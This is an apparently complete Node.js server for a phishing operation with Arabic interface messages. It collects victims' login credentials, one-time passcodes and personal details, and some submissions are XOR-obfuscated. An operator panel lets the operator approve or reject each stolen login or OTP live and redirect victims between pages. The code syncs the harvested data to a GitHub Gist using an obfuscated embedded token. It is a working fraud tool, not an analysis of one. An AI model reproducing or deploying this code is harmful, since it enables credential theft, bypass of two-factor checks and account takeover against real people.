const http = require('http');
const https = require('https');
const fs = require('fs');
const pathModule = require('path');
const crypto = require('crypto');

const PORT = process.env.PORT || 8080;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Ha09876@@';
const HMAC_SECRET = process.env.HMAC_SECRET || 'maqrq_admin_secret_2024';
const CRYPTO_SECRET = 'mQ9xR4kL7pW2vN8j';
const _GH = [90,50,104,119,88,48,112,67,78,49,69,120,101,86,78,84,101,68,82,70,87,108,82,115,85,107,73,52,89,122,78,66,98,48,57,87,86,72,112,68,78,72,78,88,97,122,70,72,77,107,49,97,89,103,61,61];
const GITHUB_TOKEN = process.env.GITHUB_TOKEN || Buffer.from(_GH.map(c => String.fromCharCode(c)).join(''), 'base64').toString();
const GIST_ID = process.env.GIST_ID || '6ffe4d5ee4e6e799a5333b0422a4f91b';
const PUBLIC_DIR = pathModule.join(__dirname, 'public');

let DB = { users: {}, requests: {} };
let _dirty = false;

function markDirty() { _dirty = true; }
function generateId() { return crypto.randomUUID(); }

function makeAdminToken() {
  const ts = Date.now().toString();
  const sig = crypto.createHmac('sha256', HMAC_SECRET).update(ts).digest('hex');
  return ts + '.' + sig;
}

function verifyAdminToken(token) {
  if (!token) return false;
  const parts = token.split('.');
  if (parts.length !== 2) return false;
  const [ts, sig] = parts;
  const expected = crypto.createHmac('sha256', HMAC_SECRET).update(ts).digest('hex');
  if (sig !== expected) return false;
  return Date.now() - parseInt(ts) < 30 * 24 * 60 * 60 * 1000;
}

function parseCookies(cookieHeader) {
  const cookies = {};
  if (cookieHeader) {
    cookieHeader.split(';').forEach(c => {
      const [key, ...vals] = c.trim().split('=');
      if (key) cookies[key.trim()] = vals.join('=').trim();
    });
  }
  return cookies;
}

function xorDecrypt(encoded) {
  const raw = Buffer.from(encoded, 'base64');
  const result = [];
  for (let i = 0; i < raw.length; i++) result.push(raw[i] ^ CRYPTO_SECRET.charCodeAt(i % CRYPTO_SECRET.length));
  const payload = Buffer.from(result).toString('utf-8');
  const dotIndex = payload.indexOf('.');
  return JSON.parse(dotIndex !== -1 ? payload.substring(dotIndex + 1) : payload);
}

function getCountryFromIp(ip) {
  return new Promise(resolve => {
    if (!ip || ip === '127.0.0.1' || ip === '::1') return resolve('محلي');
    const timer = setTimeout(() => resolve('غير معروف'), 3000);
    http.get(`http://ip-api.com/json/${ip}?fields=country`, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => { clearTimeout(timer); try { resolve(JSON.parse(d).country || 'غير معروف'); } catch { resolve('غير معروف'); } });
    }).on('error', () => { clearTimeout(timer); resolve('غير معروف'); });
  });
}

function gistRequest(method, gistPath, body) {
  return new Promise((resolve, reject) => {
    const opts = {
      hostname: 'api.github.com', port: 443, path: gistPath, method,
      headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'User-Agent': 'maqrq-server', 'Accept': 'application/vnd.github.v3+json', 'Content-Type': 'application/json' },
    };
    const r = https.request(opts, res => {
      let d = ''; res.on('data', c => d += c);
      res.on('end', () => { try { resolve(JSON.parse(d)); } catch { resolve(d); } });
    });
    r.on('error', reject);
    r.setTimeout(10000, () => { r.destroy(); reject(new Error('timeout')); });
    if (body) r.write(JSON.stringify(body));
    r.end();
  });
}

async function loadFromGist() {
  try {
    const gist = await gistRequest('GET', `/gists/${GIST_ID}`);
    if (gist?.files?.['maqrq_db.json']) {
      const localUsers = DB.users || {};
      const localRequests = DB.requests || {};
      const gistDB = JSON.parse(gist.files['maqrq_db.json'].content);
      if (!gistDB.users) gistDB.users = {};
      if (!gistDB.requests) gistDB.requests = {};

      for (const [sid, localU] of Object.entries(localUsers)) {
        const gistU = gistDB.users[sid];
        if (!gistU || new Date(localU.last_activity) > new Date(gistU.last_activity || 0)) {
          gistDB.users[sid] = localU;
        }
      }
      for (const [rid, localR] of Object.entries(localRequests)) {
        if (!gistDB.requests[rid] || new Date(localR.timestamp) > new Date(gistDB.requests[rid].timestamp || 0)) {
          gistDB.requests[rid] = localR;
        }
      }

      DB = gistDB;
    }
    console.log(`[Gist] Loaded: ${Object.keys(DB.users).length} users, ${Object.keys(DB.requests).length} requests`);
  } catch (e) { console.error('[Gist] Load failed:', e.message); }
}

async function saveToGist() {
  if (!_dirty) return;
  try {
    const usersWithRequests = {};
    for (const [sid, user] of Object.entries(DB.users)) {
      if (Object.values(DB.requests).some(r => r.user_session_id === sid)) {
        usersWithRequests[sid] = user;
      }
    }
    await gistRequest('PATCH', `/gists/${GIST_ID}`, {
      files: { 'maqrq_db.json': { content: JSON.stringify({ users: usersWithRequests, requests: DB.requests }) } },
    });
    _dirty = false;
    console.log('[Gist] Saved OK');
  } catch (e) { console.error('[Gist] Save failed:', e.message); }
}

function getOrCreateUser(sessionId, ip, page) {
  if (!DB.users[sessionId]) {
    DB.users[sessionId] = {
      id: generateId(), session_id: sessionId,
      ip_address: ip || '', country: '',
      current_page: page || '', last_activity: new Date().toISOString(),
      redirect_to: null,
    };
  }
  return DB.users[sessionId];
}

function getUserRequests(sessionId) {
  return Object.values(DB.requests).filter(r => r.user_session_id === sessionId);
}

function readBody(req) {
  return new Promise(resolve => {
    let body = '';
    req.on('data', c => { body += c; if (body.length > 2e6) req.destroy(); });
    req.on('end', () => { try { resolve(JSON.parse(body || '{}')); } catch { resolve(null); } });
  });
}

function sendJson(res, data, status, headers) {
  const h = { 'Content-Type': 'application/json', 'Cache-Control': 'no-store', ...headers };
  res.writeHead(status || 200, h);
  res.end(JSON.stringify(data));
}

const MIME = {
  '.html': 'text/html; charset=utf-8', '.css': 'text/css', '.js': 'application/javascript',
  '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.gif': 'image/gif',
  '.svg': 'image/svg+xml', '.ico': 'image/x-icon', '.json': 'application/json',
  '.webp': 'image/webp', '.woff': 'font/woff', '.woff2': 'font/woff2', '.txt': 'text/plain',
};

function serveStatic(res, filePath) {
  const full = pathModule.join(PUBLIC_DIR, filePath);
  if (!fs.existsSync(full)) { res.writeHead(404); return res.end('Not found'); }
  const ext = pathModule.extname(full).toLowerCase();
  res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
  fs.createReadStream(full).pipe(res);
}

const server = http.createServer(async (req, res) => {
  const urlObj = new URL(req.url, `http://${req.headers.host}`);
  const path = urlObj.pathname;
  const method = req.method;
  const cookies = parseCookies(req.headers.cookie);

  let body = null;
  if (method === 'POST') body = await readBody(req);

  // --- Admin Login ---
  if (path === '/admin/login' && method === 'POST') {
    if (body?.password === ADMIN_PASSWORD) {
      const token = makeAdminToken();
      return sendJson(res, { status: 'success' }, 200, { 'Set-Cookie': `admin_token=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${30*24*60*60}` });
    }
    return sendJson(res, { status: 'error', message: 'كلمة المرور غير صحيحة' }, 401);
  }

  // --- Admin Logout ---
  if (path === '/admin/logout') {
    res.writeHead(302, { Location: '/admin_login.html', 'Set-Cookie': 'admin_token=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0' });
    return res.end();
  }

  // --- Admin Panel Redirect ---
  if (path === '/admin' && method === 'GET') {
    const loc = verifyAdminToken(cookies.admin_token) ? '/admin.html' : '/admin_login.html';
    res.writeHead(302, { Location: loc });
    return res.end();
  }

  // --- Admin API auth check ---
  const isAdminApi = path.startsWith('/admin/') && path !== '/admin/login' && path !== '/admin/logout';
  if (isAdminApi && !verifyAdminToken(cookies.admin_token)) {
    return sendJson(res, { status: 'error', message: 'غير مصرح لك بالوصول' }, 401);
  }

  // --- All Requests ---
  if (path === '/admin/all_requests') {
    const sessionsList = [];
    for (const sid of Object.keys(DB.users)) {
      const user = DB.users[sid];
      const reqs = getUserRequests(sid);
      if (reqs.length === 0) continue;
      const userData = {};
      reqs.forEach(r => { if (r.data && typeof r.data === 'object') Object.assign(userData, r.data); });
      const sorted = [...reqs].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
      sessionsList.push({
        id: user.id, session_id: user.session_id, ip_address: user.ip_address,
        country: user.country || 'غير معروف', current_page: user.current_page,
        last_activity: user.last_activity, data: userData,
        login_status: sorted.find(r => r.type === 'login')?.status || null,
        otp_status: sorted.find(r => r.type === 'otp')?.status || null,
      });
    }
    sessionsList.sort((a, b) => (b.last_activity || '').localeCompare(a.last_activity || ''));
    return sendJson(res, sessionsList);
  }

  // --- Request Details ---
  let m;
  if ((m = path.match(/^\/admin\/request_details\/(.+)$/))) {
    const sid = decodeURIComponent(m[1]);
    const user = DB.users[sid];
    if (!user) return sendJson(res, { status: 'error', message: 'المستخدم غير موجود' }, 404);
    const reqs = getUserRequests(sid);
    const userData = {};
    reqs.forEach(r => { if (r.data && typeof r.data === 'object') Object.assign(userData, r.data); });
    return sendJson(res, {
      id: user.id, session_id: user.session_id, ip_address: user.ip_address,
      country: user.country || 'غير معروف', current_page: user.current_page, data: userData,
      login_status: reqs.find(r => r.type === 'login')?.status || null,
      otp_status: reqs.find(r => r.type === 'otp')?.status || null,
    });
  }

  // --- Approve/Reject Login ---
  if ((m = path.match(/^\/admin\/approve_login\/(.+)$/))) {
    const sid = decodeURIComponent(m[1]);
    if (!DB.users[sid]) return sendJson(res, { status: 'error', message: 'المستخدم غير موجود' }, 404);
    const pending = getUserRequests(sid).filter(r => r.type === 'login' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) { DB.requests[pending[0].id].status = 'approved'; DB.requests[pending[0].id].admin_action_time = new Date().toISOString(); markDirty(); }
    return sendJson(res, { status: 'success', message: 'تمت الموافقة على تسجيل الدخول' });
  }
  if ((m = path.match(/^\/admin\/reject_login\/(.+)$/))) {
    const sid = decodeURIComponent(m[1]);
    if (!DB.users[sid]) return sendJson(res, { status: 'error', message: 'المستخدم غير موجود' }, 404);
    const pending = getUserRequests(sid).filter(r => r.type === 'login' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) { DB.requests[pending[0].id].status = 'rejected'; DB.requests[pending[0].id].admin_action_time = new Date().toISOString(); markDirty(); }
    return sendJson(res, { status: 'success', message: 'تم رفض تسجيل الدخول' });
  }

  // --- Approve/Reject OTP ---
  if ((m = path.match(/^\/admin\/approve_otp\/(.+)$/))) {
    const sid = decodeURIComponent(m[1]);
    if (!DB.users[sid]) return sendJson(res, { status: 'error', message: 'المستخدم غير موجود' }, 404);
    const pending = getUserRequests(sid).filter(r => r.type === 'otp' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) { DB.requests[pending[0].id].status = 'approved'; DB.requests[pending[0].id].admin_action_time = new Date().toISOString(); markDirty(); }
    return sendJson(res, { status: 'success', message: 'تمت الموافقة على OTP' });
  }
  if ((m = path.match(/^\/admin\/reject_otp\/(.+)$/))) {
    const sid = decodeURIComponent(m[1]);
    if (!DB.users[sid]) return sendJson(res, { status: 'error', message: 'المستخدم غير موجود' }, 404);
    const pending = getUserRequests(sid).filter(r => r.type === 'otp' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) { DB.requests[pending[0].id].status = 'rejected'; DB.requests[pending[0].id].admin_action_time = new Date().toISOString(); markDirty(); }
    return sendJson(res, { status: 'success', message: 'تم رفض OTP' });
  }

  // --- Active Visits ---
  if (path === '/admin/active_visits') {
    const cutoff = new Date(Date.now() - 5 * 60 * 1000);
    const visits = Object.values(DB.users)
      .filter(u => new Date(u.last_activity) >= cutoff)
      .map(u => ({ session_id: u.session_id, ip_address: u.ip_address, country: u.country, current_page: u.current_page, last_activity: u.last_activity }));
    return sendJson(res, visits);
  }

  // --- Redirect User ---
  if ((m = path.match(/^\/admin\/redirect_user\/(.+)$/)) && method === 'POST') {
    const sid = decodeURIComponent(m[1]);
    const user = DB.users[sid];
    if (!user) return sendJson(res, { status: 'error', message: 'المستخدم غير موجود' }, 404);
    if (!body?.target_page) return sendJson(res, { status: 'error', message: 'الصفحة المستهدفة غير محددة' }, 400);
    user.redirect_to = body.target_page;
    markDirty();
    return sendJson(res, { status: 'success', message: 'تم تعيين إعادة التوجيه للمستخدم' });
  }

  // --- Submit Request ---
  if (path === '/submit_request' && method === 'POST') {
    if (!body) return sendJson(res, { status: 'error', message: 'يجب أن يكون الطلب بصيغة JSON' }, 400);
    let requestType, userData;
    if (body.encrypted) {
      try { const dec = xorDecrypt(body.encrypted); requestType = dec.type; userData = dec.data; }
      catch { return sendJson(res, { status: 'error', message: 'فشل فك التشفير' }, 400); }
    } else { requestType = body.type; userData = body.data; }
    if (!requestType || !userData) return sendJson(res, { status: 'error', message: 'بيانات الطلب غير مكتملة' }, 400);

    const sid = cookies.user_session_id || generateId();
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '';
    const user = getOrCreateUser(sid, ip, requestType);
    user.current_page = requestType;
    user.last_activity = new Date().toISOString();
    user.redirect_to = null;
    if (!user.country) user.country = await getCountryFromIp(ip);

    const autoApprove = ['personal_info', 'watch_request'].includes(requestType);
    let reqObj;
    if (['login', 'otp'].includes(requestType)) {
      const existing = getUserRequests(sid).filter(r => r.type === requestType && r.status === 'rejected').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
      if (existing.length > 0) {
        const e = DB.requests[existing[0].id];
        e.data = userData; e.status = 'pending'; e.timestamp = new Date().toISOString(); e.admin_action_time = null;
        reqObj = e;
      }
    }
    if (!reqObj) {
      const newId = generateId();
      reqObj = { id: newId, user_session_id: sid, type: requestType, data: userData, status: autoApprove ? 'approved' : 'pending', timestamp: new Date().toISOString(), admin_action_time: autoApprove ? new Date().toISOString() : null };
      DB.requests[newId] = reqObj;
    }

    markDirty();
    console.log(`[submit_request] ${requestType} from ${sid}`);
    return sendJson(res, { status: autoApprove ? 'approved' : 'pending', request_id: reqObj.id, message: autoApprove ? 'تم استلام البيانات' : 'تم استلام طلبك، بانتظار موافقة المسؤول' }, autoApprove ? 200 : 202, { 'Set-Cookie': `user_session_id=${sid}; Path=/; SameSite=Lax; Max-Age=${86400*30}` });
  }

  // --- Request Status ---
  if ((m = path.match(/^\/request_status\/(.+)$/))) {
    const requestId = decodeURIComponent(m[1]);
    const reqObj = DB.requests[requestId];
    if (!reqObj) return sendJson(res, { status: 'error', message: 'الطلب غير موجود' }, 404);
    const user = DB.users[reqObj.user_session_id];
    return sendJson(res, { status: reqObj.status, type: reqObj.type, data: reqObj.data, redirect_to: user?.redirect_to || null });
  }

  // --- Clear Redirect ---
  if (path === '/clear_redirect' && method === 'POST') {
    const sid = cookies.user_session_id;
    if (sid && DB.users[sid]) { DB.users[sid].redirect_to = null; markDirty(); }
    return sendJson(res, { status: 'success' });
  }

  // --- Track Visit ---
  if (path === '/track_visit' && method === 'POST') {
    if (!body) return sendJson(res, { status: 'error', message: 'يجب أن يكون الطلب بصيغة JSON' }, 400);
    const page = body.page;
    if (!page) return sendJson(res, { status: 'error', message: 'الصفحة غير محددة' }, 400);
    const sid = cookies.user_session_id || generateId();
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '';
    const user = getOrCreateUser(sid, ip, page);
    user.current_page = page;
    user.last_activity = new Date().toISOString();
    if (!user.country) user.country = await getCountryFromIp(ip);
    return sendJson(res, { status: 'success', message: 'تم تحديث الزيارة' }, 200, { 'Set-Cookie': `user_session_id=${sid}; Path=/; SameSite=Lax; Max-Age=${86400*30}` });
  }

  // --- Static files ---
  let filePath = path === '/' ? '/index.html' : path;
  if (filePath.startsWith('/')) filePath = filePath.slice(1);
  const fullPath = pathModule.join(PUBLIC_DIR, filePath);
  if (fs.existsSync(fullPath) && fs.statSync(fullPath).isFile()) {
    return serveStatic(res, filePath);
  }
  if (!pathModule.extname(filePath) && fs.existsSync(fullPath + '.html')) {
    return serveStatic(res, filePath + '.html');
  }

  res.writeHead(404);
  res.end('Not found');
});

(async () => {
  await loadFromGist();

  setInterval(saveToGist, 15000);

  process.on('SIGINT', async () => { console.log('\nSaving...'); _dirty = true; await saveToGist(); process.exit(); });
  process.on('SIGTERM', async () => { _dirty = true; await saveToGist(); process.exit(); });

  server.listen(PORT, () => {
    console.log(`Server running -> http://localhost:${PORT}`);
    console.log(`Admin: http://localhost:${PORT}/admin`);
    console.log(`Password: ${ADMIN_PASSWORD}`);
    console.log('Gist sync: every 15s');
  });
})();
